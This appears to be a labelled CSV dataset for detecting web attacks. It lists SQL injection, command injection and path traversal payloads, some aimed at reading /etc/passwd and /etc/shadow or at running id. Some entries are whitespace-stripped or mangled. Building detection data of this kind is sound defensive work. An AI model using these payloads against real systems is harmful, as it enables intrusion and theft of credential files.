payload,attack_type,label
1'where8584=8584orderby1#,sqli,1
1'))asplbtwhere4368=4368and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)--,sqli,1
"1""orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and""ekjs""like""ekjs",sqli,1
"1""))or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1%"")or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(""%""=""",sqli,1
"&&+|+dirc:"",12,cmdi,anom$&&dirc:""",cmdi,1
"+dir+c:"",8,cmdi,anom$&&dir+c:""",cmdi,1
+|+dir+c:/,cmdi,1
$+|+dir+c:/,cmdi,1
&&+|+dirc:/,cmdi,1
$&&dir+c:/,cmdi,1
+dir+c:/,cmdi,1
+dir+c:+|,cmdi,1
+|+dir+c:+|,cmdi,1
"dir+c:"",7,cmdi,anom||+dir|c:""",cmdi,1
"<!--#execcmd=""/bin/cat/etc/shadow""-->",cmdi,1
"<!--#execcmd=""/usr/bin/id;-->",cmdi,1
/index.html|id|,cmdi,1
;id;,cmdi,1
;id,cmdi,1
|id,cmdi,1
|/usr/bin/id,cmdi,1
|id|,cmdi,1
||/usr/bin/id|,cmdi,1
|id;,cmdi,1
||/usr/bin/id;,cmdi,1
;|/usr/bin/id|,cmdi,1
/bin/ls-al,cmdi,1
/usr/bin/id,cmdi,1
id,cmdi,1
/usr/bin/id;,cmdi,1
id;,cmdi,1
/usr/bin/id|,cmdi,1
id|,cmdi,1
;/usr/bin/id,cmdi,1
|usr/bin/id,cmdi,1
|nid,cmdi,1
`id`,cmdi,1
`/usr/bin/id`,cmdi,1
a);id,cmdi,1
a;id,cmdi,1
a);id;,cmdi,1
a;id;,cmdi,1
a);id|,cmdi,1
a;id|,cmdi,1
a)|id,cmdi,1
a|id,cmdi,1
a)|id;,cmdi,1
|/bin/ls-al,cmdi,1
a);/usr/bin/id,cmdi,1
a;/usr/bin/id,cmdi,1
a);/usr/bin/id;,cmdi,1
a;/usr/bin/id;,cmdi,1
a);/usr/bin/id|,cmdi,1
a;/usr/bin/id|,cmdi,1
a)|/usr/bin/id,cmdi,1
a|/usr/bin/id,cmdi,1
a)|/usr/bin/id;,cmdi,1
;system('cat/etc/passwd'),cmdi,1
;system('id'),cmdi,1
;system('/usr/bin/id'),cmdi,1
cat/etc/passwd,cmdi,1
&ping-i30127.0.0.1&,cmdi,1
&ping-n30127.0.0.1&,cmdi,1
ping-i30127.0.0.1,cmdi,1
`ping127.0.0.1`,cmdi,1
$;/usr/bin/id,cmdi,1
asdf3334,cmdi,1
;/bin/sleep31;,cmdi,1
'uname',cmdi,1
'false',cmdi,1
'true',cmdi,1
"""`uname`""",cmdi,1
"""`false`""",cmdi,1
`uname`,cmdi,1
`false`,cmdi,1
`true`,cmdi,1
""";/bin/sleep31;",cmdi,1
';/bin/sleep31;,cmdi,1
|/bin/sleep31;,cmdi,1
"""|/bin/sleep31;",cmdi,1
'|/bin/sleep31;,cmdi,1
ping.exe-n31127.0.0.1,cmdi,1
"""ping.exe-n31127.0.0.1",cmdi,1
1and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric),sqli,1
"1%'));selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdualand(('%'='",sqli,1
1')))and3715in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(3715=3715)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and((('njge'like'njge,sqli,1
"1')where7007=7007or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1"")))and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and(((""gfwz""=""gfwz",sqli,1
"1))aspjjzwhere8384=8384andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))--",sqli,1
"1%""))orderby1#",sqli,1
1));select(casewhen(3855=3855)then3855else1/(select0)end)--,sqli,1
"1);select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
"1)orchar(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"-2122"")aszytbwhere7025=7025or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
"1)asnsdywhere7513=7513;select*fromgenerate_series(3267,3267,casewhen(3267=5900)then1else0end)limit1--",sqli,1
1)asimdtwhere6431=6431;beginuser_lock.sleep(5);end--,sqli,1
1'))aseltxwhere9955=9955and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
1)and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and(6518=6518,sqli,1
1'||(select'mosp'where6085=6085;waitfordelay'0:0:5'--,sqli,1
"1')where1093=1093andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))--",sqli,1
"1%"")));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4and(((""%""=""",sqli,1
"-6789'||(select'uckz'fromdualwhere2163=2163unionallselect2163,2163,2163,2163,2163,2163--",sqli,1
"-6108')unionallselect2519,2519,2519,2519--",sqli,1
1)where3979=3979rlikesleep(5)--,sqli,1
-8143)unionallselect3014--,sqli,1
"-9954""))or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and((""bifi""=""bifi",sqli,1
1')where6624=6624and5392=8258,sqli,1
"-3884""where8012=8012unionallselect8012,8012#",sqli,1
"1%""orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and""%""=""",sqli,1
"1%');selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"1"")where2834=2834(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)--",sqli,1
"1)where9371=9371unionallselectnull,null,null,null,null,null,null--",sqli,1
"1""where7380=7380or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1)where2679=2679or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1"")where2388=2388unionallselectnull,null,null,null,null,null,null,null,null--",sqli,1
/../../../../../../../../../../../../etc/passwd,path-traversal,1
/etc/passwd,path-traversal,1
file:/etc/passwd,path-traversal,1
........................etcpasswd,path-traversal,1
file:........................etcpasswd,path-traversal,1
/....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd,path-traversal,1
//../....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd,path-traversal,1
................................................etcpasswd,path-traversal,1
c:oot.ini,path-traversal,1
c:/boot.ini,path-traversal,1
........................oot.ini,path-traversal,1
file:/c:/boot.ini,path-traversal,1
file:/c:oot.ini,path-traversal,1
file:/boot.ini,path-traversal,1
c:/windows/win.ini,path-traversal,1
c:windowswin.ini,path-traversal,1
file:/c:/windows/win.ini,path-traversal,1
......................../windows/win.ini,path-traversal,1
../../web-inf/web.xml,path-traversal,1
/../../web-inf/web.xml,path-traversal,1
....web-infweb.xml,path-traversal,1
....web-inf/web.xml,path-traversal,1
web-inf/web.xml,path-traversal,1
/web-inf/web.xml,path-traversal,1
web-infweb.xml,path-traversal,1
....//....//web-inf/web.xml,path-traversal,1
/....//....//web-inf/web.xml,path-traversal,1
//......//....//web-inf/web.xml,path-traversal,1
/../web-inf/web.xml,path-traversal,1
/../../../web-inf/web.xml,path-traversal,1
/../../../../web-inf/web.xml,path-traversal,1
..web-infweb.xml,path-traversal,1
......web-infweb.xml,path-traversal,1
........web-infweb.xml,path-traversal,1
..........web-infweb.xml,path-traversal,1
/./,path-traversal,1
c:/inetpub/wwwroot/global.asa,path-traversal,1
c:inetpubwwwrootglobal.asa,path-traversal,1
d:inetpubwwwrootglobal.asa,path-traversal,1
d:/inetpub/wwwroot/global.asa,path-traversal,1
/../{file},path-traversal,1
/../../{file},path-traversal,1
/../../../../../{file},path-traversal,1
/../../../../../../{file},path-traversal,1
/../../../../../../../{file},path-traversal,1
/../../../../../../../../{file},path-traversal,1
/..{file},path-traversal,1
/....{file},path-traversal,1
/......{file},path-traversal,1
/........{file},path-traversal,1
/..........{file},path-traversal,1
/............{file},path-traversal,1
/..............{file},path-traversal,1
/................{file},path-traversal,1
//{file},path-traversal,1
////{file},path-traversal,1
/////{file},path-traversal,1
//////{file},path-traversal,1
///////{file},path-traversal,1
////////{file},path-traversal,1
/////////{file},path-traversal,1
/{file},path-traversal,1
//..{file},path-traversal,1
//../..{file},path-traversal,1
//../../..{file},path-traversal,1
//../../../..{file},path-traversal,1
//../../../../..{file},path-traversal,1
//../../../../../..{file},path-traversal,1
//../../../../../../..{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../{file},path-traversal,1
-9336'or5641=9488#,sqli,1
"-3205"")unionallselect5233,5233,5233,5233#",sqli,1
1')rlike(select*from(select(sleep(5)))vwyq)#,sqli,1
"1"")where7548=7548;selectsleep(5)--",sqli,1
1';(select*from(select(sleep(5)))srmq),sqli,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..{file},path-traversal,1
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....{file},path-traversal,1
